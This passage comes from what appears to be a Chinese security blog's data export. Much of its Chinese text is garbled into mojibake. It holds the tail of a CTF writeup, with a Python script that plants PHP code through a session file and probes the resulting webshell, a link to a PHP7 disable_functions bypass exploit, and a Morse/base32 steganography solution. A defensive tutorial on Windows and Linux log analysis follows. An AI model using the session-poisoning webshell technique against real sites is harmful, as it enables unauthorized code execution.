s.post(url+&#x27;home/member/search&#x27;,data=data1,headers=headers)def backdoor(): data2=&#123;&quot;1&quot;:&quot;echo &#x27;hacker!&#x27;;&quot;&#125; r=requests.post(url+&quot;runtime/session/sess_1433223143322314332231433223.php&quot;,data=data2) if &quot;hacker&quot; in r.text: print(&quot;[+] vulnerable!!!&quot;)req()register(data)login(data)search()backdoor() ç„¶åèšå‰‘è¿ï¼Œå‘ç°æ²¡æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒæŸ¥çœ‹phpinfo()ï¼Œå‘ç°ï¼š å¸¸è§„çš„bypassæ–¹æ³•éƒ½ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œæœ‰ä¸ªé¡¹ç›®æ˜¯å…³äºphp7 bypass disable_functionçš„ï¼š https://github.com/mm0r1/exploits/ è¿™é‡Œç”¨çš„å°±æ˜¯ï¼š https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php misccode_in_morseæ–‡ä»¶æ˜¯æµé‡åŒ…ï¼Œwiresharkæ‰“å¼€ï¼Œå¯¼å‡ºæ‰€æœ‰httpå¯¹è±¡å‘ç°æœ‰ä¸ª12.jpgï¼Œæ— æ³•æ˜¾ç¤º hxdæ‰“å¼€å‘ç°æ˜¯æ‘©æ–¯å¯†ç ï¼Œè§£å¯†çš„base32ï¼Œå†è§£å¯†å‘ç°å°±ä¹±ç äº†ä½†èƒ½çœ‹å‡ºæ¥æ˜¯pngæ–‡ä»¶ å†™äº†ä¸ªè„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from __future__ import print_functionimport base64a = open(&#x27;12.jpg&#x27;,&#x27;r&#x27;).read()s = a.split(&quot; &quot;)dict = &#123;&#x27;.-&#x27;: &#x27;A&#x27;, &#x27;-...&#x27;: &#x27;B&#x27;, &#x27;-.-.&#x27;: &#x27;C&#x27;, &#x27;-..&#x27;:&#x27;D&#x27;, &#x27;.&#x27;:&#x27;E&#x27;, &#x27;..-.&#x27;:&#x27;F&#x27;, &#x27;--.&#x27;: &#x27;G&#x27;, &#x27;....&#x27;: &#x27;H&#x27;, &#x27;..&#x27;: &#x27;I&#x27;, &#x27;.---&#x27;:&#x27;J&#x27;, &#x27;-.-&#x27;: &#x27;K&#x27;, &#x27;.-..&#x27;: &#x27;L&#x27;, &#x27;--&#x27;: &#x27;M&#x27;, &#x27;-.&#x27;: &#x27;N&#x27;, &#x27;---&#x27;: &#x27;O&#x27;, &#x27;.--.&#x27;: &#x27;P&#x27;, &#x27;--.-&#x27;: &#x27;Q&#x27;, &#x27;.-.&#x27;: &#x27;R&#x27;, &#x27;...&#x27;: &#x27;S&#x27;, &#x27;-&#x27;: &#x27;T&#x27;, &#x27;..-&#x27;: &#x27;U&#x27;, &#x27;...-&#x27;: &#x27;V&#x27;, &#x27;.--&#x27;: &#x27;W&#x27;, &#x27;-..-&#x27;: &#x27;X&#x27;, &#x27;-.--&#x27;: &#x27;Y&#x27;, &#x27;--..&#x27;: &#x27;Z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;..--..&#x27;: &#x27;?&#x27;, &#x27;-..-.&#x27;: &#x27;/&#x27;, &#x27;-.--.-&#x27;: &#x27;()&#x27;, &#x27;-....-&#x27;: &#x27;-&#x27;, &#x27;.-.-.-&#x27;: &#x27;.&#x27; &#125;;tr=&#x27;&#x27;for item in s: if item in dict: tr+=dict[item]# print(tr)if len(tr)%8 != 0: tr+=&#x27;=&#x27;*(8-len(tr)%8)de=base64.b32decode(tr.encode(&#x27;utf-8&#x27;))with open(&#x27;1.png&#x27;,&#x27;wb&#x27;) as fp: fp.write(de)# print(de) å¯ä»¥ç›´æ¥ç”Ÿæˆpngå›¾ç‰‡ pdf417è§£å¯†ï¼Œè§£å¯†åœ°å€ï¼šhttps://online-barcode-reader.inliteresearch.com 1https:&#x2F;&#x2F;s2.ax1x.com&#x2F;2020&#x2F;02&#x2F;06&#x2F;1yPXJ1.jpg å¥—å¨ƒï¼Œä¸‹è½½ä¸‹æ¥ï¼ŒæŸ¥çœ‹å±æ€§å‘ç°F5ï¼ŒçŒœæµ‹F5éšå†™ï¼Œæ²¡æƒ³åˆ°æ˜¯æ²¡å¯†ç çš„ 1java Extract 1yPXJ1.jpg åœ¨output.txté‡Œæ‰¾åˆ°flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"}]},{"title":"æ—¥å¿—åˆ†æ","slug":"æ—¥å¿—å’Œæµé‡åˆ†æ","date":"2020-02-18T08:57:25.000Z","updated":"2020-03-03T14:19:32.626Z","comments":true,"path":"2020/02/18/æ—¥å¿—å’Œæµé‡åˆ†æ/","link":"","permalink":"http://www.m00nback.xyz/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ—¥å¿—å®¡è®¡çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ—¥å¿—å®¡è®¡çš„ç›¸å…³å†…å®¹ï¼ ç³»ç»Ÿæ—¥å¿—windowsæ—¥å¿—åˆ†ææ—¥å¿—è®°å½•äº†ç³»ç»Ÿä¸­ç¡¬ä»¶ã€è½¯ä»¶å’Œç³»ç»Ÿé—®é¢˜çš„ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜ç›‘è§†ç€ç³»ç»Ÿä¸­å‘ç”Ÿçš„äº‹ä»¶ã€‚å½“æœåŠ¡å™¨è¢«å…¥ä¾µæˆ–è€…ç³»ç»Ÿï¼ˆåº”ç”¨ï¼‰å‡ºç°é—®é¢˜æ—¶ï¼Œç®¡ç†å‘˜å¯ä»¥æ ¹æ®æ—¥å¿—è¿…é€Ÿå®šä½é—®é¢˜çš„å…³é”®ï¼Œå†å¿«é€Ÿå¤„ç†é—®é¢˜ï¼Œä»è€Œæå¤§åœ°æé«˜å·¥ä½œæ•ˆç‡å’ŒæœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚Windows é€šè¿‡è‡ªå¸¦äº‹ä»¶æŸ¥çœ‹å™¨ç®¡ç†æ—¥å¿—ï¼Œä½¿ç”¨å‘½ä»¤eventvwr.mscæˆ–eventvwræ‰“å¼€ Windows æ—¥å¿—ä½ç½®Windows 2000/Server2003/Windows XP 1\\%SystemRoot%\\System32\\Config\\*.evt Windows Vista/7/10/Server2008/Sever2016: 1\\%SystemRoot%\\System32\\winevt\\Logs\\*.evtx %SystemRoot%ä¸ºç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œé»˜è®¤å€¼ä¸ºC:\\WINDOWS å‡ ä¸ªé‡è¦çš„äº‹ä»¶æ—¥å¿—æ–‡ä»¶è¯´æ˜ï¼ˆVista/Win7/Win8/Win10/Server2008/Server 2012åŠä¹‹åçš„ç‰ˆæœ¬)ï¼š äº‹ä»¶ç±»å‹ æè¿° æ–‡ä»¶å ç³»ç»Ÿ åŒ…å«ç³»ç»Ÿè¿›ç¨‹ï¼Œè®¾å¤‡ç£ç›˜æ´»åŠ¨ç­‰ã€‚äº‹ä»¶è®°å½•äº†è®¾å¤‡é©±åŠ¨æ— æ³•æ­£å¸¸å¯åŠ¨æˆ–åœæ­¢ï¼Œç¡¬ä»¶å¤±è´¥ï¼Œé‡å¤IPåœ°å€ï¼Œç³»ç»Ÿè¿›ç¨‹çš„å¯åŠ¨ï¼Œåœæ­¢åŠæš‚åœç­‰è¡Œä¸ºã€‚ System.evtx å®‰å…¨ åŒ…å«å®‰å…¨æ€§ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ç”¨æˆ·æƒé™å˜æ›´ï¼Œç™»å½•åŠæ³¨é”€ï¼Œæ–‡ä»¶åŠæ–‡ä»¶å¤¹è®¿é—®ï¼Œæ‰“å°ç­‰ä¿¡æ¯ã€‚ Security.evtx åº”ç”¨ç¨‹åº åŒ…å«æ“ä½œç³»ç»Ÿå®‰è£…çš„åº”ç”¨ç¨‹åºè½¯ä»¶ç›¸å…³çš„äº‹ä»¶ã€‚äº‹ä»¶åŒ…æ‹¬äº†é”™è¯¯ã€è­¦å‘ŠåŠä»»ä½•åº”ç”¨ç¨‹åºéœ€è¦æŠ¥å‘Šçš„ä¿¡æ¯ï¼Œåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å¯ä»¥å†³å®šè®°å½•å“ªäº›ä¿¡æ¯ã€‚ Application.evtx Microsoft Microsoftæ–‡ä»¶å¤¹ä¸‹åŒ…å«äº†200å¤šä¸ªå¾®è½¯å†…ç½®çš„äº‹ä»¶æ—¥å¿—åˆ†ç±»ï¼Œåªæœ‰éƒ¨åˆ†ç±»å‹é»˜è®¤å¯ç”¨è®°å½•åŠŸèƒ½ï¼Œå¦‚è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯è¿æ¥ã€æ— çº¿ç½‘ç»œã€æœ‰çº¿ç½‘è·¯ã€è®¾å¤‡å®‰è£…ç­‰ç›¸å…³æ—¥å¿—ã€‚ è¯¦è§æ—¥å¿—å­˜å‚¨ç›®å½•å¯¹åº”æ–‡ä»¶ Microsoft Office Alerts å¾®è½¯Officeåº”ç”¨ç¨‹åºï¼ˆåŒ…æ‹¬Word/Excel/PowerPointç­‰ï¼‰çš„å„ç§è­¦å‘Šä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·å¯¹æ–‡æ¡£æ“ä½œè¿‡ç¨‹ä¸­å‡ºç°çš„å„ç§è¡Œä¸ºï¼Œè®°å½•æœ‰æ–‡ä»¶åã€è·¯å¾„ç­‰ä¿¡æ¯ã€‚ OAerts.evtx Windows PowerShell Windowsè‡ªå¸¦çš„PowerShellåº”ç”¨çš„æ—¥å¿—ä¿¡æ¯ã€‚ Windows PowerShell.evtx Internet Explorer IEæµè§ˆå™¨åº”ç”¨ç¨‹åºçš„æ—¥å¿—ä¿¡æ¯ï¼Œé»˜è®¤æœªå¯ç”¨ï¼Œéœ€è¦é€šè¿‡ç»„ç­–ç•¥è¿›è¡Œé…ç½®ã€‚ Internet Explorer.evtx äº‹ä»¶ç±»å‹Windowsäº‹ä»¶æ—¥å¿—ä¸­å…±æœ‰äº”ç§äº‹ä»¶ç±»å‹ï¼Œæ‰€æœ‰çš„äº‹ä»¶å¿…é¡»æ‹¥æœ‰äº”ç§äº‹ä»¶ç±»å‹ä¸­çš„ä¸€ç§ï¼Œä¸”åªå¯ä»¥æœ‰ä¸€ç§ã€‚äº”ç§äº‹ä»¶ç±»å‹åˆ†ä¸ºï¼š **ä¿¡æ¯(Information)**ï¼šä¿¡æ¯äº‹ä»¶æŒ‡åº”ç”¨ç¨‹åºã€é©±åŠ¨ç¨‹åºæˆ–æœåŠ¡çš„æˆåŠŸæ“ä½œçš„äº‹ä»¶ã€‚ è­¦å‘Š(Warning)ï¼šè­¦å‘Šäº‹ä»¶æŒ‡ä¸æ˜¯ç›´æ¥çš„ã€ä¸»è¦çš„ï¼Œä½†æ˜¯ä¼šå¯¼è‡´å°†æ¥é—®é¢˜å‘ç”Ÿçš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå½“ç£ç›˜ç©ºé—´ä¸è¶³æˆ–æœªæ‰¾åˆ°æ‰“å°æœºæ—¶ï¼Œéƒ½ä¼šè®°å½•ä¸€ä¸ªâ€œè­¦å‘Šâ€äº‹ä»¶ã€‚ é”™è¯¯(Error)ï¼šé”™è¯¯äº‹ä»¶æŒ‡ç”¨æˆ·åº”è¯¥çŸ¥é“çš„é‡è¦çš„é—®é¢˜ã€‚é”™è¯¯äº‹ä»¶é€šå¸¸æŒ‡åŠŸèƒ½å’Œæ•°æ®çš„ä¸¢å¤±ã€‚ä¾‹å¦‚,å¦‚æœä¸€ä¸ªæœåŠ¡ä¸èƒ½ä½œä¸ºç³»ç»Ÿå¼•å¯¼è¢«åŠ è½½ï¼Œé‚£ä¹ˆå®ƒä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯äº‹ä»¶ã€‚ æˆåŠŸå®¡æ ¸(Success audit)ï¼šæˆåŠŸçš„å®¡æ ¸å®‰å…¨è®¿é—®å°è¯•ï¼Œä¸»è¦æ˜¯æŒ‡å®‰å…¨æ€§æ—¥å¿—ï¼Œè¿™é‡Œè®°å½•ç€ç”¨æˆ·ç™»å½•/æ³¨é”€ã€å¯¹è±¡è®¿é—®ã€ç‰¹æƒä½¿ç”¨ã€è´¦æˆ·ç®¡ç†ã€ç­–ç•¥æ›´æ”¹ã€è¯¦ç»†è·Ÿè¸ªã€ç›®å½•æœåŠ¡è®¿é—®ã€è´¦æˆ·ç™»å½•ç­‰äº‹ä»¶ï¼Œä¾‹å¦‚æ‰€æœ‰çš„æˆåŠŸç™»å½•ç³»ç»Ÿéƒ½ä¼šè¢«è®°å½•ä¸ºâ€œ æˆåŠŸå®¡æ ¸â€äº‹ä»¶ã€‚ å¤±è´¥å®¡æ ¸(Failure audit)ï¼šå¤±è´¥çš„å®¡æ ¸å®‰å…¨ç™»å½•å°è¯•ï¼Œä¾‹å¦‚ç”¨æˆ·è¯•å›¾è®¿é—®ç½‘ç»œé©±åŠ¨å™¨å¤±è´¥ï¼Œåˆ™è¯¥å°è¯•ä¼šè¢«ä½œä¸ºå¤±è´¥å®¡æ ¸äº‹ä»¶è®°å½•ä¸‹æ¥ã€‚ é‡è¦äº‹ä»¶IDWindowsäº‹ä»¶æ—¥å¿—ä¸­è®°å½•çš„ä¿¡æ¯ä¸­ï¼Œå…³é”®çš„è¦ç´ åŒ…å«äº‹ä»¶çº§åˆ«ã€è®°å½•æ—¶é—´ã€äº‹ä»¶æ¥æºã€äº‹ä»¶IDã€äº‹ä»¶æè¿°ã€æ¶‰åŠçš„ç”¨æˆ·ã€è®¡ç®—æœºã€æ“ä½œä»£ç åŠä»»åŠ¡ç±»åˆ«ç­‰ã€‚å…¶ä¸­äº‹ä»¶çš„IDä¸æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬æœ‰å…³ï¼Œä»¥ä¸‹åˆ—ä¸¾å‡ºçš„äº‹ä»¶IDçš„æ“çºµç³»ç»Ÿä¸ºVista/Win7/Win8/Win10/Server2008/Server 2012åŠä¹‹åçš„ç‰ˆæœ¬ï¼š äº‹ä»¶ID è¯´æ˜ 1102 æ¸…ç†å®¡è®¡æ—¥å¿— 4624 è´¦å·æˆåŠŸç™»å½• 4625 è´¦å·ç™»å½•å¤±è´¥ 4768 Kerberosèº«ä»½éªŒè¯ï¼ˆTGTè¯·æ±‚ï¼‰ 4769 KerberosæœåŠ¡ç¥¨è¯è¯·æ±‚ 4776 NTLMèº«ä»½éªŒè¯ 4672 æˆäºˆç‰¹æ®Šæƒé™ 4720 åˆ›å»ºç”¨æˆ· 4726 åˆ é™¤ç”¨æˆ· 4728 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„å…¨å±€ç»„ä¸­ 4729 å°†æˆå‘˜ä»å®‰å…¨çš„å…¨å±€ç»„ä¸­ç§»é™¤ 4732 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­ 4733 å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­ç§»é™¤ 4756 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„é€šç”¨ç»„ä¸­ 4757 å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨çš„é€šç”¨ç»„ä¸­ç§»é™¤ 4719 ç³»ç»Ÿå®¡è®¡ç­–ç•¥ä¿®æ”¹ äº”ç§äº‹ä»¶ç±»å‹ä¸­ï¼Œæœ€ä¸ºé‡è¦çš„æ˜¯æˆåŠŸå®¡æ ¸ï¼ˆSuccess Auditï¼‰ï¼Œæ‰€æœ‰ç³»ç»Ÿç™»å½•æˆåŠŸéƒ½ä¼šè¢«æ ‡è®°æˆä¸ºæˆåŠŸå®¡æ ¸ã€‚æ¯ä¸ªæˆåŠŸç™»å½•çš„äº‹ä»¶éƒ½ä¼šæ ‡è®°ä¸€ä¸ªç™»å½•ç±»å‹ï¼š ç™»å½•ç±»å‹ æè¿° 2 äº¤äº’å¼ç™»å½•ï¼ˆç”¨æˆ·ä»æ§åˆ¶å°ç™»å½•ï¼‰ 3 ç½‘ç»œï¼ˆä¾‹å¦‚ï¼šé€šè¿‡net use,è®¿é—®å…±äº«ç½‘ç»œï¼‰ 4 æ‰¹å¤„ç†ï¼ˆä¸ºæ‰¹å¤„ç†ç¨‹åºä¿ç•™ï¼‰ 5 æœåŠ¡å¯åŠ¨ï¼ˆæœåŠ¡ç™»å½•ï¼‰ 6 ä¸æ”¯æŒ 7 è§£é”ï¼ˆå¸¦å¯†ç ä¿æŠ¤çš„å±å¹•ä¿æŠ¤ç¨‹åºçš„æ— äººå€¼ç­å·¥ä½œç«™ï¼‰ 8 ç½‘ç»œæ˜æ–‡ï¼ˆIISæœåŠ¡å™¨ç™»å½•éªŒè¯ï¼‰ 10 è¿œç¨‹äº¤äº’ï¼ˆç»ˆç«¯æœåŠ¡ï¼Œè¿œç¨‹æ¡Œé¢ï¼Œè¿œç¨‹è¾…åŠ©ï¼‰ 11 ç¼“å­˜åŸŸè¯ä¹¦ç™»å½• è¿œç¨‹è¿æ¥æ—¥å¿—ï¼ˆåº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ—¥å¿—-&gt;Microsoft-&gt;Windows-&gt;-TerminalServices-RemoteConnectionManager-&gt;Operationalï¼‰ï¼Œé‡è¦äº‹ä»¶ ID å’Œå«ä¹‰ï¼š 1149ï¼šç”¨æˆ·è®¤è¯æˆåŠŸ 21ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡ï¼šä¼šè¯ç™»å½•æˆåŠŸ 24ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡ï¼šä¼šè¯å·²æ–­å¼€è¿æ¥ 25ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡ï¼šä¼šè¯é‡æ–°è¿æ¥æˆåŠŸ è®¡åˆ’ä»»åŠ¡äº‹ä»¶æ—¥å¿—(åº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ—¥å¿—-&gt;Microsoft-&gt;Windows-&gt;TaskScheduler-&gt;Operational)ï¼Œè®¡åˆ’ä»»åŠ¡ ID å«ä¹‰ï¼š 100ï¼šä»»åŠ¡å·²å¼€å§‹ 102ï¼šä»»åŠ¡å®Œæˆ 106ï¼šå·²æ³¨å†Œä»»åŠ¡ï¼ˆå…³æ³¨ç‚¹ï¼‰ 107ï¼šåœ¨è°ƒåº¦ç¨‹åºä¸Šè§¦å‘ä»»åŠ¡ 110ï¼šç”¨æˆ·è§¦å‘çš„ä»»åŠ¡ 129ï¼šåˆ›å»ºä»»åŠ¡æµç¨‹ï¼ˆæ¨å‡ºï¼‰ 140ï¼šä»»åŠ¡å·²æ›´æ–° 141ï¼šä»»åŠ¡å·²åˆ é™¤ 200ï¼šè¿è¡Œè®¡åˆ’ä»»åŠ¡ 325ï¼šå¯åŠ¨è¯·æ±‚æ’é˜Ÿ æ›´å¤šè¯¦ç»†äº‹ä»¶idè¯´æ˜å‚è§å¾®è½¯å®˜æ–¹ï¼šhttps://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 å·¥å…·åˆ†ææ—¥å¿—Log ParserLog Parserï¼ˆæ˜¯å¾®è½¯å…¬å¸å‡ºå“çš„æ—¥å¿—åˆ†æå·¥å…·ï¼Œå®ƒåŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨ç®€å•ï¼Œå¯ä»¥åˆ†æåŸºäºæ–‡æœ¬çš„æ—¥å¿—æ–‡ä»¶ã€XML æ–‡ä»¶ã€CSVï¼ˆé€—å·åˆ†éš”ç¬¦ï¼‰æ–‡ä»¶ï¼Œä»¥åŠæ“ä½œç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ã€æ³¨å†Œè¡¨ã€æ–‡ä»¶ç³»ç»Ÿã€Active Directoryã€‚å®ƒå¯ä»¥åƒä½¿ç”¨ SQL è¯­å¥ä¸€æ ·æŸ¥è¯¢åˆ†æè¿™äº›æ•°æ®ï¼Œç”šè‡³å¯ä»¥æŠŠåˆ†æç»“æœä»¥å„ç§å›¾è¡¨çš„å½¢å¼å±•ç°å‡ºæ¥ã€‚ Log Parser 2.2ä¸‹è½½åœ°å€ï¼šhttps://www.microsoft.com/en-us/download/details.aspx?id=24659 é»˜è®¤ä¼šå®‰è£…åˆ°C:\\Program Files (x86)\\Log Parser 2.2ç›®å½•ä¸‹ åŸºæœ¬æŸ¥è¯¢ç»“æ„ 1Logparser.exe â€“i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:xx.evtx&quot; ä½¿ç”¨Log Parseråˆ†ææ—¥å¿— 1ã€æŸ¥è¯¢ç™»å½•æˆåŠŸçš„äº‹ä»¶ 12345678ç™»å½•æˆåŠŸçš„æ‰€æœ‰äº‹ä»¶LogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:Security.evtx where EventID&#x3D;4624&quot;æŒ‡å®šç™»å½•æ—¶é—´èŒƒå›´çš„äº‹ä»¶ï¼šLogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:Security.evtx where TimeGenerated&gt;&#39;2020-02-19 23:32:11&#39; and TimeGenerated&lt;&#39;2020-02-20 01:00:00&#39; and EventID&#x3D;4624&quot;æå–ç™»å½•æˆåŠŸçš„ç”¨æˆ·åå’ŒIPï¼šLogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as Username,EXTRACT_TOKEN(Message,38,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4624&quot; 2ã€æŸ¥è¯¢ç™»å½•å¤±è´¥çš„äº‹ä»¶ 12345ç™»å½•å¤±è´¥çš„æ‰€æœ‰äº‹ä»¶ï¼šLogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT * FROM c:Security.evtx where EventID&#x3D;4625&quot;æå–ç™»å½•å¤±è´¥ç”¨æˆ·åè¿›è¡Œèšåˆç»Ÿè®¡ï¼šLogParser.exe -i:EVT &quot;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as EventType,EXTRACT_TOKEN(Message,19,&#39; &#39;) as user,count(EXTRACT_TOKEN(Message,19,&#39; &#39;)) as Times,EXTRACT_TOKEN(Message,39,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4625 GROUP BY Message&quot; 3ã€ç³»ç»Ÿå†å²å¼€å…³æœºè®°å½•ï¼š 1LogParser.exe -i:EVT â€“o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message FROM c:System.evtx where EventID&#x3D;6005 or EventID&#x3D;6006&quot; Get-WinEventæ˜¯ä¸€ä¸ªä»æœ¬åœ°å’Œè¿œç¨‹è®¡ç®—æœºä¸Šçš„äº‹ä»¶æ—¥å¿—å’Œäº‹ä»¶è·Ÿè¸ªæ—¥å¿—æ–‡ä»¶ä¸­è·å–äº‹ä»¶çš„å·¥å…· 1234567891011121314151617181920212223# Get-WinEventå¸®åŠ©å‘½ä»¤get-help Get-WinEvent# åˆ—å‡ºæ‰€æœ‰äº‹ä»¶æ—¥å¿—Get-WinEvent -ListLog *# powershellç®¡ç†å‘˜æƒé™ä¸‹è·å–å®‰å…¨äº‹ä»¶æ—¥å¿—Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;Security&#x27;&#125;# è¿‡æ»¤å®‰å…¨äº‹ä»¶ID 4624Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;Security&#x27;;ID=&#x27;4624&#x27;&#125;# æŸ¥è¯¢ä»Šå¤©çš„åº”ç”¨å’Œç³»ç»Ÿæ—¥å¿—ï¼Œæ˜¾ç¤ºå‰2æ¡Get-WinEvent @&#123;logname=&#x27;application&#x27;,&#x27;system&#x27;;starttime=[datetime]::today &#125; -MaxEvents 2# æ ¹æ®IDæŸ¥è¯¢äº‹ä»¶Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Where-Object &#123;$_.ID -eq &quot;4100&quot; -or $_.ID -eq &quot;4104&quot;&#125;# æŸ¥è¯¢æŒ‡å®šæ—¶é—´å†…çš„äº‹ä»¶$StartTime=Get-Date -Year 2020 -Month 2 -Day 18 -Hour 23 -Minute 30$EndTime=Get-Date -Year 2020 -Month 2 -Day 19 -Hour 0 -Minute 10Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;System&#x27;;StartTime=$StartTime;EndTime=$EndTime&#125; è¯¦ç»†ä½¿ç”¨å¯ä»¥å‚è€ƒï¼šhttps://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Diagnostics/Get-WinEvent?view=powershell-5.1 Linuxæ—¥å¿—åˆ†æLinuxæ—¥å¿—ä½ç½®æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/* å¸¸è§çš„æ—¥å¿—æ–‡ä»¶ï¼š è·¯å¾„ è¯´æ˜ /var/log/messages è®°å½• Linux å†…æ ¸æ¶ˆæ¯åŠå„ç§åº”ç”¨ç¨‹åºçš„å…¬å…±æ—¥å¿—ä¿¡æ¯ /var/log/cron è®°å½• crond è®¡åˆ’ä»»åŠ¡äº§ç”Ÿçš„äº‹ä»¶ä¿¡æ¯ /var/log/dmesg è®°å½• Linux æ“ä½œç³»ç»Ÿåœ¨å¼•å¯¼è¿‡ç¨‹ä¸­çš„å„ç§äº‹ä»¶ä¿¡æ¯ /var/log/maillog è®°å½•è¿›å…¥æˆ–å‘å‡ºç³»ç»Ÿçš„ç”µå­é‚®ä»¶æ´»åŠ¨ /var/log/lastlog è®°å½•æ¯ä¸ªç”¨æˆ·æœ€è¿‘çš„ç™»å½•äº‹ä»¶ /var/log/secure è®°å½•ç”¨æˆ·è®¤è¯ç›¸å…³çš„å®‰å…¨äº‹ä»¶ä¿¡æ¯ /var/log/wtmp è®°å½•æ¯ä¸ªç”¨æˆ·ç™»å½•ã€æ³¨é”€åŠç³»ç»Ÿå¯åŠ¨å’Œåœæœºäº‹ä»¶ /var/log/btmp è®°å½•å¤±è´¥çš„ã€é”™è¯¯çš„ç™»å½•å°è¯•åŠéªŒè¯äº‹ä»¶ å¯ä»¥çœ‹åˆ°å‘è¡Œç‰ˆæœ¬å·®åˆ«æ—¥å¿—æ–‡ä»¶å¯èƒ½ä¸å°½ç›¸åŒ Ubuntuæ—¥å¿—æ–‡ä»¶ï¼š 12345678910111213141516171819202122&#x2F;var&#x2F;log&#x2F;alternatives.log-æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­&#x2F;var&#x2F;log&#x2F;apport.log -åº”ç”¨ç¨‹åºå´©æºƒè®°å½•&#x2F;var&#x2F;log&#x2F;apt&#x2F; -ç”¨apt-getå®‰è£…å¸è½½è½¯ä»¶çš„ä¿¡æ¯&#x2F;var&#x2F;log&#x2F;auth.log -ç™»å½•è®¤è¯log&#x2F;var&#x2F;log&#x2F;boot.log -åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚&#x2F;var&#x2F;log&#x2F;btmp -è®°å½•æ‰€æœ‰å¤±è´¥å¯åŠ¨ä¿¡æ¯&#x2F;var&#x2F;log&#x2F;Consolekit - è®°å½•æ§åˆ¶å°ä¿¡æ¯&#x2F;var&#x2F;log&#x2F;cpus - æ¶‰åŠæ‰€æœ‰æ‰“å°ä¿¡æ¯çš„æ—¥å¿—&#x2F;var&#x2F;log&#x2F;dist-upgrade - dist-upgradeè¿™ç§æ›´æ–°æ–¹å¼çš„ä¿¡æ¯&#x2F;var&#x2F;log&#x2F;dmesg -åŒ…å«å†…æ ¸ç¼“å†²ä¿¡æ¯ï¼ˆkernel ringbufferï¼‰ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œæ˜¾ç¤ºå±å¹•ä¸Šçš„ä¸ç¡¬ä»¶æœ‰å…³çš„ä¿¡æ¯&#x2F;var&#x2F;log&#x2F;dpkg.log - åŒ…æ‹¬å®‰è£…æˆ–dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚&#x2F;var&#x2F;log&#x2F;faillog - åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚&#x2F;var&#x2F;log&#x2F;fontconfig.log -ä¸å­—ä½“é…ç½®æœ‰å…³çš„logã€‚&#x2F;var&#x2F;log&#x2F;fsck - æ–‡ä»¶ç³»ç»Ÿæ—¥å¿—&#x2F;var&#x2F;log&#x2F;faillog 